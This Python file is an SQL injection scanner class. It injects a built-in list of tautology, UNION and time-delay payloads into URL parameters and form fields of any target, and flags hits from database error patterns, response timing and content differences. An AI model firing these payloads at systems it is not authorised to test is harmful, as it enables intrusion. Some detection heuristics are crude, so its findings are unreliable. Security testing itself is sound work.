import requests
from bs4 import BeautifulSoup
import re
import urllib.parse
from urllib.parse import urljoin
import logging
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

logger = logging.getLogger(__name__)

class SQLInjectionTester:
    def __init__(self):
        self.payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "' OR '1'='1'/*",
            "') OR ('1'='1",
            "')) OR (('1'='1",
            "' OR 1=1--",
            "' OR 'a'='a",
            "') OR ('a'='a",
            "' OR 1=1#",
            "' OR 1=1/*",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "1' ORDER BY 1--",
            "1' ORDER BY 2--",
            "1' ORDER BY 3--",
            "1' AND SLEEP(5)--",
            "1' AND BENCHMARK(5000000,MD5(1))--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' OR EXISTS(SELECT 1 FROM users)--",
            "' HAVING 1=1--",
            "' GROUP BY 1--",
            "' SELECT SLEEP(5)--",
            "admin' --",
            "admin' #",
            "admin'/*",
            "' or ''-'",
            "' or '' '",
            "' or ''&'",
            "' or ''^'",
            "' or ''*'",
            "or true--",
            ") or true--",
            "') or true--",
            "')) or true--",
            "))) or true--",
            "' waitfor delay '0:0:5'--",
            "1; waitfor delay '0:0:5'--"
        ]
        
        self.error_patterns = [
            r"SQL syntax.*?MySQL",
            r"Warning.*?\Wmysqli?_",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"check the manual that (corresponds to|fits) your MySQL server version",
            r"Unknown column '[^']+' in 'field list'",
            r"MySqlClient\.",
            r"com\.mysql\.jdbc",
            r"Syntax error or access violation",
            r"ORA-[0-9][0-9][0-9][0-9]",
            r"Oracle error",
            r"Oracle.*?Driver",
            r"Warning.*?\Woci_",
            r"Microsoft SQL Server",
            r"SQLServer JDBC Driver",
            r"SqlException",
            r"Syntax error.*?SQL",
            r"SQLSTATE",
            r"PostgreSQL.*?ERROR",
            r"Warning.*?\Wpg_",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"PG::SyntaxError:",
            r"org\.postgresql\.util\.PSQLException",
            r"ERROR:\s+syntax error at or near",
            r"ERROR: parser: parse error at or near",
            r"SQLite/JDBCDriver",
            r"SQLite\.Exception",
            r"System\.Data\.SQLite\.SQLiteException",
            r"Warning.*?\Wsqlite_",
            r"Warning.*?\Wpdo_"
        ]
        
        self.success_patterns = [
            r"You have an error in your SQL syntax",
            r"Warning: mysql_",
            r"MySQL server version for the right syntax",
            r"supplied argument is not a valid MySQL",
            r"unclosed quotation mark after the character string",
            r"quoted string not properly terminated",
            r"ORA-[0-9][0-9][0-9][0-9]",
            r"Oracle error",
            r"PostgreSQL.*ERROR",
            r"Warning.*pg_",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"SQLite/JDBCDriver",
            r"SQLite\.Exception",
            r"System\.Data\.SQLite\.SQLiteException",
            r"Warning.*sqlite_",
            r"Warning.*SQLite3::",
            r"\[SQLite\]",
            r"SQLite error",
            r"SQLite.*Driver",
            r"Warning.*oci_.*",
            r"Warning.*ora_.*"
        ]
        
        self.time_delay = 5  # seconds for time-based tests
    
    def test_url(self, url):
        """Test URL parameters for SQL injection"""
        results = {
            'vulnerable': False,
            'vulnerable_params': [],
            'details': []
        }
        
        try:
            # Parse URL and get parameters
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            # Test each parameter
            for param in params:
                param_results = self._test_parameter(url, param)
                if param_results['vulnerable']:
                    results['vulnerable'] = True
                    results['vulnerable_params'].append(param)
                    results['details'].extend(param_results['details'])
            
            return results
        except Exception as e:
            results['details'].append({
                'type': 'error',
                'message': str(e)
            })
            return results
    
    def _test_parameter(self, url, param):
        """Test a specific parameter for SQL injection"""
        results = {
            'vulnerable': False,
            'details': []
        }
        
        original_value = self._get_parameter_value(url, param)
        if not original_value:
            return results
        
        # Get baseline response time
        try:
            start_time = time.time()
            requests.get(url, timeout=10, verify=False)
            baseline_time = time.time() - start_time
        except:
            baseline_time = 1  # default if can't measure
        
        for payload in self.payloads:
            try:
                # Test with payload
                test_url = self._inject_payload(url, param, payload)
                start_time = time.time()
                response = requests.get(test_url, timeout=max(10, self.time_delay * 2), verify=False)
                response_time = time.time() - start_time
                
                # 1. Error-based detection
                if self._check_error_patterns(response.text):
                    results['vulnerable'] = True
                    results['details'].append({
                        'type': 'error_based',
                        'parameter': param,
                        'payload': payload,
                        'evidence': 'SQL error in response'
                    })
                    continue
                
                # 2. Time-based detection
                if 'SLEEP' in payload.upper() or 'BENCHMARK' in payload.upper() or 'WAITFOR' in payload.upper():
                    if response_time > (baseline_time + self.time_delay):
                        results['vulnerable'] = True
                        results['details'].append({
                            'type': 'time_based',
                            'parameter': param,
                            'payload': payload,
                            'evidence': f'Response time: {response_time:.2f}s (baseline: {baseline_time:.2f}s)'
                        })
                        continue
                
                # 3. Boolean-based detection
                if self._check_boolean_based_injection(url, param, payload, original_value):
                    results['vulnerable'] = True
                    results['details'].append({
                        'type': 'boolean_based',
                        'parameter': param,
                        'payload': payload,
                        'evidence': 'Different response content detected'
                    })
                    continue
                
                # 4. Union-based detection
                if 'UNION SELECT' in payload.upper() and self._check_union_based_injection(response.text):
                    results['vulnerable'] = True
                    results['details'].append({
                        'type': 'union_based',
                        'parameter': param,
                        'payload': payload,
                        'evidence': 'UNION-based injection successful'
                    })
                    continue
                
            except Exception as e:
                results['details'].append({
                    'type': 'error',
                    'parameter': param,
                    'payload': payload,
                    'message': str(e)
                })
                continue
        
        return results
    
    def _check_error_patterns(self, content):
        """Check for SQL error patterns in response"""
        return any(re.search(pattern, content, re.IGNORECASE) for pattern in self.error_patterns)
    
    def _check_boolean_based_injection(self, url, param, payload, original_value):
        """Check for boolean-based SQL injection"""
        try:
            # Get original response
            original_response = requests.get(url, timeout=10, verify=False)
            original_content = original_response.text
            
            # Test with payload
            test_url = self._inject_payload(url, param, payload)
            payload_response = requests.get(test_url, timeout=10, verify=False)
            payload_content = payload_response.text
            
            # Compare responses (excluding dynamic content)
            original_filtered = self._filter_dynamic_content(original_content)
            payload_filtered = self._filter_dynamic_content(payload_content)
            
            return original_filtered != payload_filtered
            
        except Exception:
            return False
    
    def _check_union_based_injection(self, content):
        """Check for successful UNION-based injection"""
        # Look for common indicators of successful UNION injection
        patterns = [
            r"[0-9a-f]{32}",  # MD5 hash pattern
            r"\b(id|name|username|email)\b.*?\b(id|name|username|email)\b",  # Column names
            r"\b(varchar|int|text)\b",  # SQL types
            r"[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"  # IP address
        ]
        return any(re.search(pattern, content, re.IGNORECASE) for pattern in patterns)
    
    def _filter_dynamic_content(self, content):
        """Remove dynamic content from response"""
        # Remove timestamps
        content = re.sub(r"\d{1,2}:\d{2}:\d{2}", "", content)
        # Remove dates
        content = re.sub(r"\d{1,2}[-/]\d{1,2}[-/]\d{2,4}", "", content)
        # Remove session IDs
        content = re.sub(r"PHPSESSID=.*?;", "", content)
        return content
    
    def _get_parameter_value(self, url, param):
        """Get original parameter value"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        return params.get(param, [''])[0]
    
    def _inject_payload(self, url, param, payload):
        """Inject SQL payload into URL parameter"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))
    
    def scan_form(self, url):
        """Scan forms on a page for SQL injection vulnerabilities"""
        results = {
            'vulnerable_forms': [],
            'details': []
        }
        
        try:
            response = requests.get(url, timeout=10, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            
            for form in forms:
                form_results = self._test_form(url, form)
                if form_results['vulnerable']:
                    results['vulnerable_forms'].append(form.get('action', ''))
                    results['details'].extend(form_results['details'])
        
        except Exception as e:
            results['details'].append({
                'type': 'error',
                'message': str(e)
            })
        
        return results
    
    def _test_form(self, base_url, form):
        """Test a form for SQL injection vulnerabilities"""
        results = {
            'vulnerable': False,
            'details': []
        }
        
        try:
            # Get form details
            action = form.get('action', '')
            if not action:
                action = base_url
            elif not action.startswith(('http://', 'https://')):
                action = urljoin(base_url, action)
            
            method = form.get('method', 'get').lower()
            
            # Test each input field
            for input_field in form.find_all('input'):
                if input_field.get('type') not in ['submit', 'button', 'image', 'reset', 'file']:
                    field_name = input_field.get('name')
                    if field_name:
                        for payload in self.payloads:
                            try:
                                # Test with payload
                                data = {field_name: payload}
                                if method == 'get':
                                    response = requests.get(action, params=data, timeout=10, verify=False)
                                else:
                                    response = requests.post(action, data=data, timeout=10, verify=False)
                                
                                # Check for SQL errors
                                if self._check_error_patterns(response.text):
                                    results['vulnerable'] = True
                                    results['details'].append({
                                        'type': 'error_based',
                                        'form': action,
                                        'field': field_name,
                                        'payload': payload,
                                        'evidence': 'SQL error in response'
                                    })
                                    continue
                                
                                # Check for time-based injection
                                if 'SLEEP' in payload.upper() or 'BENCHMARK' in payload.upper():
                                    start_time = time.time()
                                    if method == 'get':
                                        response = requests.get(action, params=data, timeout=max(10, self.time_delay * 2), verify=False)
                                    else:
                                        response = requests.post(action, data=data, timeout=max(10, self.time_delay * 2), verify=False)
                                    response_time = time.time() - start_time
                                    
                                    if response_time > self.time_delay:
                                        results['vulnerable'] = True
                                        results['details'].append({
                                            'type': 'time_based',
                                            'form': action,
                                            'field': field_name,
                                            'payload': payload,
                                            'evidence': f'Response time: {response_time:.2f}s'
                                        })
                                        continue
                                
                            except Exception as e:
                                results['details'].append({
                                    'type': 'error',
                                    'form': action,
                                    'field': field_name,
                                    'payload': payload,
                                    'message': str(e)
                                })
                                continue
        
        except Exception as e:
            results['details'].append({
                'type': 'error',
                'message': str(e)
            })
        
        return results 